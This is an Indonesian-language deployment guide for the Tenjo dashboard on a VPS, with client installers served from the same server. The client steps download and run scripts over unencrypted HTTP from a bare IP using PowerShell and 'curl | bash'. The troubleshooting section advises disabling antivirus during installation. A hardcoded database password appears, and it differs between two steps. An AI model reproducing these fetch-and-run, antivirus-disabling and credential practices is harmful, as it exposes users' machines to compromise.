# Quick Start - Deploy Tenjo ke BiznetGio Cloud

## 🚀 **Langkah Cepat Deployment**

### 1. Setup VPS BiznetGio (5 menit)
```bash
# Login ke BiznetGio Cloud Portal
# Create VPS: Ubuntu 22.04, 2GB RAM, 2vCPU
# IP Address: 103.129.149.67

# SSH ke server
ssh root@103.129.149.67
```

### 2. Install Dependencies (10 menit)
```bash
# Update system
apt update && apt upgrade -y

# Install semua yang dibutuhkan
apt install -y curl wget git unzip nginx postgresql postgresql-contrib
curl -fsSL https://deb.nodesource.com/setup_18.x | bash -
apt install -y nodejs
add-apt-repository ppa:ondrej/php -y && apt update
apt install -y php8.2 php8.2-fpm php8.2-cli php8.2-pgsql php8.2-zip php8.2-gd php8.2-mbstring php8.2-curl php8.2-xml

# Install Composer
curl -sS https://getcomposer.org/installer | php
mv composer.phar /usr/local/bin/composer
chmod +x /usr/local/bin/composer
```

### 3. Setup Database (3 menit)
```bash
# Start PostgreSQL
systemctl start postgresql
systemctl enable postgresql

# Create database
sudo -u postgres psql -c "CREATE DATABASE tenjo_production;"
sudo -u postgres psql -c "CREATE USER tenjo_user WITH ENCRYPTED PASSWORD 'TenjoSecure2025\!';"
sudo -u postgres psql -c "GRANT ALL PRIVILEGES ON DATABASE tenjo_production TO tenjo_user;"
```

### 4. Deploy Application (5 menit)
```bash
# Clone dan setup
cd /var/www
git clone https://github.com/Adi-Sumardi/Tenjo.git
cd Tenjo/dashboard

# Install dependencies
composer install --no-dev --optimize-autoloader
npm install && npm run build

# Configure environment
cp .env.example .env
```

Edit `.env`:
```env
APP_URL=http://103.129.149.67
DB_CONNECTION=pgsql
DB_HOST=127.0.0.1
DB_DATABASE=tenjo_production
DB_USERNAME=tenjo_user
DB_PASSWORD=TenjoSecure2024!
```

```bash
# Generate key dan migrate
php artisan key:generate
php artisan migrate --force
php artisan storage:link

# Set permissions
chown -R www-data:www-data /var/www/Tenjo
chmod -R 775 /var/www/Tenjo/dashboard/storage
```

### 5. Configure Nginx (3 menit)
```bash
# Create Nginx config
cat > /etc/nginx/sites-available/tenjo << 'EOF'
server {
    listen 80;
    server_name _;
    root /var/www/Tenjo/dashboard/public;
    index index.php;

    location / {
        try_files $uri $uri/ /index.php?$query_string;
    }

    location ~ \.php$ {
        fastcgi_pass unix:/var/run/php/php8.2-fpm.sock;
        fastcgi_param SCRIPT_FILENAME $realpath_root$fastcgi_script_name;
        include fastcgi_params;
    }
}
EOF

# Enable site
ln -s /etc/nginx/sites-available/tenjo /etc/nginx/sites-enabled/
rm /etc/nginx/sites-enabled/default
nginx -t && systemctl restart nginx
```

### 6. Setup Client Downloads (2 menit)
```bash
# Copy client files to public
mkdir -p /var/www/Tenjo/dashboard/public/downloads
cp /var/www/Tenjo/client/*.bat /var/www/Tenjo/dashboard/public/downloads/
cp /var/www/Tenjo/client/*.sh /var/www/Tenjo/dashboard/public/downloads/
chmod +x /var/www/Tenjo/dashboard/public/downloads/*.sh

# Set proper permissions
chown -R www-data:www-data /var/www/Tenjo/dashboard/public/downloads
```

## ✅ **Testing (2 menit)**

```bash
# Test web dashboard
curl -I http://103.129.149.67

# Check if all services running
systemctl status nginx
systemctl status postgresql
systemctl status php8.2-fpm
```

Visit: `http://103.129.149.67` - Dashboard should be accessible!

## 📱 **Client Installation Commands**

**Windows (Run as Administrator) - Main Installer:**
```cmd
powershell -Command "Invoke-WebRequest -Uri 'http://103.129.149.67/downloads/easy_install_windows.bat' -OutFile 'tenjo_install.bat'; .\tenjo_install.bat"
```

**Windows (Run as Administrator) - Quick Installer (If main fails):**
```cmd
powershell -Command "Invoke-WebRequest -Uri 'http://103.129.149.67/downloads/quick_install_windows.bat' -OutFile 'tenjo_quick.bat'; .\tenjo_quick.bat"
```

**macOS:**
```bash
curl -sSL http://103.129.149.67/downloads/easy_install_macos.sh | bash
```

## 🔒 **Optional: Setup SSL (5 menit)**

```bash
# Install Certbot
apt install -y certbot python3-certbot-nginx

# Get SSL certificate (needs domain)
certbot --nginx -d yourdomain.com

# Update client commands to use https://103.129.149.67
```

## 💡 **Tips**

- **Domain**: Point your domain to VPS IP for SSL
- **Firewall**: `ufw allow 'Nginx Full' && ufw enable`
- **Monitoring**: Check logs with `tail -f /var/www/Tenjo/dashboard/storage/logs/laravel.log`
- **Updates**: `cd /var/www/Tenjo && git pull origin master`

**Total Time: ~30 menit untuk full deployment!** 🚀

## 📞 **Support**

**Common Issues:**
- **502 Error**: `systemctl restart php8.2-fpm nginx`
- **Permission Error**: `chown -R www-data:www-data /var/www/Tenjo`
- **Database Error**: Check `.env` database credentials
- **Windows Install Error**: Try the quick installer or install Python manually first
- **Antivirus Blocking**: Temporarily disable antivirus during client installation

**Log Locations:**
- Laravel: `/var/www/Tenjo/dashboard/storage/logs/laravel.log`
- Nginx: `/var/log/nginx/error.log`
- PHP: `/var/log/php8.2-fpm.log`
